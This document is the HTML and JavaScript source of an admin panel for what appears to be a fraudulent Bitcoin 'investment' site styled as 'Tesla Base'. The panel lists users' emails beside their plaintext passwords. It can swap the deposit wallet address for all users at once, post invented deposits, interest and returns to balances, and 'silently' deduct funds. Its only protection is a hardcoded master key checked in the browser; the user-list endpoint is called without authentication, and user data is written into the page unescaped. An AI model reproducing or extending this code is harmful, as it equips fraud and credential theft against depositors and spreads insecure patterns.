<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Base | Master Admin Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --t-red: #E31937; --bg: #000; --card: #0a0a0a; --border: #1a1a1a; --success: #00ffa3; --warning: #ffb800; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
        
        /* Secret Login Gate */
        #authGate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .gate-card { background: var(--card); padding: 40px; border-radius: 20px; border: 1px solid var(--border); text-align: center; width: 90%; max-width: 400px; }
        input[type="password"], input[type="text"] { width: 100%; padding: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 10px; margin-bottom: 20px; outline: none; }
        input:focus { border-color: var(--t-red); }
        .btn-main { background: var(--t-red); color: #fff; border: none; padding: 15px 30px; border-radius: 10px; font-weight: 800; cursor: pointer; width: 100%; }

        /* Dashboard Styles */
        #mainDashboard { display: none; max-width: 1200px; margin: 0 auto; }
        .section-card { background: var(--card); border: 1px solid var(--border); padding: 25px; border-radius: 20px; margin-bottom: 25px; }
        .section-title { font-size: 18px; font-weight: 800; color: var(--t-red); margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }

        /* Table Styles for User List */
        .scroll-container { overflow-x: auto; border-radius: 15px; border: 1px solid var(--border); }
        table { width: 100%; border-collapse: collapse; min-width: 900px; }
        th { background: #050505; color: #666; font-size: 11px; text-transform: uppercase; text-align: left; padding: 15px; }
        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; vertical-align: middle; }
        
        /* 4 Action Buttons Styling */
        .btn-group { display: flex; gap: 5px; }
        .act-btn { padding: 8px 12px; border: none; border-radius: 6px; font-size: 10px; font-weight: 800; cursor: pointer; color: #000; transition: 0.2s; }
        .btn-dep { background: var(--success); } /* Deposit */
        .btn-int { background: var(--warning); } /* Interest */
        .btn-ret { background: #00d1ff; }        /* Return */
        .btn-ded { background: #555; color: #fff; } /* Deduct */
        .act-btn:hover { opacity: 0.8; transform: translateY(-2px); }
    </style>
</head>
<body>

<div id="authGate">
    <div class="gate-card">
        <h1 style="color:var(--t-red); letter-spacing:3px;">ADMIN ACCESS</h1>
        <p style="color:#444; font-size:12px; margin-bottom:25px;">TESLA BASE MASTER TERMINAL</p>
        <input type="password" id="adminPass" placeholder="Enter Secret Master Key">
        <button class="btn-main" onclick="checkGate()">ENTER DASHBOARD</button>
    </div>
</div>

<div id="mainDashboard">
    <div class="section-card">
        <div class="section-title"><i class="fa-solid fa-wallet"></i> Global Bitcoin Wallet Update</div>
        <div style="display: flex; gap: 15px;">
            <input type="text" id="globalBtcInput" placeholder="Enter New Bitcoin Address for all Users" style="margin-bottom:0;">
            <button class="btn-main" style="width:200px;" onclick="updateGlobalWallet()">UPDATE WALLET</button>
        </div>
        <p style="font-size:11px; color:#444; margin-top:10px;">This changes the deposit address on every user's "Grow" page immediately.</p>
    </div>

    <div class="section-card">
        <div class="section-title"><i class="fa-solid fa-users"></i> User Database & Fund Injection</div>
        <div class="scroll-container">
            <table>
                <thead>
                    <tr>
                        <th>User Email</th>
                        <th>User Password</th>
                        <th>Total Balance</th>
                        <th>Fund Management (4 Actions)</th>
                    </tr>
                </thead>
                <tbody id="userTableBody">
                    </tbody>
            </table>
        </div>
    </div>
</div>
<script>
    const SECRET_KEY = "SOLOMON200";
    const api = window.location.origin;

    function checkGate() {
        if(document.getElementById('adminPass').value === SECRET_KEY) {
            document.getElementById('authGate').style.display = 'none';
            document.getElementById('mainDashboard').style.display = 'block';
            loadUsers();
        } else { alert("Access Denied"); }
    }

    async function updateGlobalWallet() {
        const addr = document.getElementById('globalBtcInput').value;
        if(!addr) return alert("Enter address");
        await fetch(`${api}/api/admin/update-wallet`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ password: SECRET_KEY, newAddress: addr })
        });
        alert("Global Wallet Updated!");
    }

    async function loadUsers() {
        const res = await fetch(`${api}/api/admin/users`);
        const users = await res.json();
        const tbody = document.getElementById('userTableBody');
        tbody.innerHTML = "";

        users.forEach(user => {
            tbody.innerHTML += `
                <tr>
                    <td style="font-weight:700;">${user.email}</td>
                    <td style="color:var(--t-red); font-family:monospace;">${user.password}</td>
                    <td style="color:var(--success); font-weight:800;">$${parseFloat(user.balance).toLocaleString()}</td>
                    <td>
                        <div class="btn-group">
                            <button class="act-btn btn-dep" onclick="modifyFunds('${user.email}', 'DEPOSIT')">DEPOSIT</button>
                            <button class="act-btn btn-int" onclick="modifyFunds('${user.email}', 'INTEREST')">INTEREST</button>
                            <button class="act-btn btn-ret" onclick="modifyFunds('${user.email}', 'RETURN')">RETURN</button>
                            <button class="act-btn btn-ded" onclick="modifyFunds('${user.email}', 'DEDUCT')">DEDUCT</button>
                        </div>
                    </td>
                </tr>
            `;
        });
    }

    async function modifyFunds(email, type) {
        let amount = prompt(`Enter amount for ${type}:`);
        if(!amount) return;
        
        let finalAmount = parseFloat(amount);
        // Silently deduct if the deduct button is used
        if(type === 'DEDUCT') {
            finalAmount = -Math.abs(finalAmount);
        }

        const res = await fetch(`${api}/api/user/update-balance`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ email, amount: finalAmount, type: type })
        });

        if(res.ok) {
            alert(`${type} of $${amount} processed for ${email}`);
            loadUsers(); // Refresh the list
        }
    }

    // Allow scrolling through users
    setInterval(loadUsers, 15000); 
</script>
</body>
</html>
